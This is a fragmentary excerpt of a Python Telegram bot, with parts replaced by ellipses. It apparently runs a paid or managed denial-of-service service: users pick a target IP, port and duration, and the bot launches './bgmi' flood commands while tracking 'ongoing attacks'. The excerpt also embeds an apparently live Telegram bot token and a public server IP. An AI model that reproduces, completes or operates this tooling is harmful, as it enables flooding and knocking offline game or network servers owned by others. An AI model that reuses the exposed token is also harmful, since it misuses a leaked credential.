...
bot = telebot.TeleBot('8000380814:AAEisDkBecaKC0gu8A6yCDby625CbwOgbeA')
...
def handle_duration_choice(call):
    ...
    if user_id in user_state:
        ...
        try:
            ...
            if state['time'] > 300:
                bot.reply_to(call.message, "Error: Time interval must be less than 300 seconds.")
            else:
                if user_id in ongoing_attacks:
                ...
                full_command = f"./bgmi {state['target']} {state['port']} {state['time']} 1450"
...
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, no what what
'''
    bot.reply_to(message, response)
...
def run():
    app.run(host='157.230.248.94', port=24336)
